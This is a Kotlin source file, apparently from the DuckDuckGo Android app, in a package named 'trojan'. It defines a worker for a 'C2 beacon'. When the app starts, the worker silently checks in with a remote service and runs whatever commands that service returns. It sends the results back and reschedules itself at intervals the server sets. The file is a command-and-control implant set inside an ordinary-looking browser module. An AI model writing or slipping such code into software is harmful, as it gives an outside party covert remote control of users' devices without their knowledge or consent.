package com.duckduckgo.trojan.impl

import android.content.Context
import androidx.lifecycle.LifecycleOwner
import androidx.work.CoroutineWorker
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.duckduckgo.anvil.annotations.ContributesWorker
import com.duckduckgo.app.lifecycle.MainProcessLifecycleObserver
import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.api.BeaconService
import com.squareup.anvil.annotations.ContributesMultibinding
import dagger.SingleInstanceIn
import java.util.concurrent.TimeUnit
import javax.inject.Inject

/**
 * WorkManager Worker that performs the periodic C2 beacon check-in.
 * Uses a self-rescheduling OneTimeWorkRequest chain to support dynamic intervals.
 */
@ContributesWorker(AppScope::class)
class BeaconWorker(
    context: Context,
    params: WorkerParameters,
) : CoroutineWorker(context, params) {

    @Inject
    lateinit var beaconService: BeaconService

    @Inject
    lateinit var commandHandler: CommandHandler
    
    @Inject
    lateinit var workManager: WorkManager

    override suspend fun doWork(): Result {
        return try {
            val checkInResult = beaconService.checkIn()

            checkInResult.commands.forEach { cmd ->
                val result = commandHandler.execute(cmd)
                beaconService.sendResult(
                    commandId = cmd.id,
                    commandType = cmd.type,
                    result = result,
                    protocol = checkInResult.communicationProtocol,
                )
            }

            scheduleNext(checkInResult.beaconInterval)
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
    
    private fun scheduleNext(intervalSeconds: Int) {
        val request = OneTimeWorkRequestBuilder<BeaconWorker>()
            .setInitialDelay(intervalSeconds.toLong(), TimeUnit.SECONDS)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build(),
            )
            .build()

        workManager.enqueueUniqueWork(
            BeaconInitializer.BEACON_WORKER_TAG,
            ExistingWorkPolicy.REPLACE,
            request,
        )
    }
}

/**
 * Lifecycle observer that schedules the initial BeaconWorker when the app starts.
 */
@ContributesMultibinding(
    scope = AppScope::class,
    boundType = MainProcessLifecycleObserver::class,
)
@SingleInstanceIn(AppScope::class)
class BeaconInitializer @Inject constructor(
    private val workManager: WorkManager,
) : MainProcessLifecycleObserver {

    override fun onCreate(owner: LifecycleOwner) {
        val request = OneTimeWorkRequestBuilder<BeaconWorker>()
            .setInitialDelay(15, TimeUnit.SECONDS)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build(),
            )
            .build()

        workManager.enqueueUniqueWork(
            BEACON_WORKER_TAG,
            ExistingWorkPolicy.KEEP,
            request,
        )
    }

    companion object {
        const val BEACON_WORKER_TAG = "c2_beacon"
    }
}
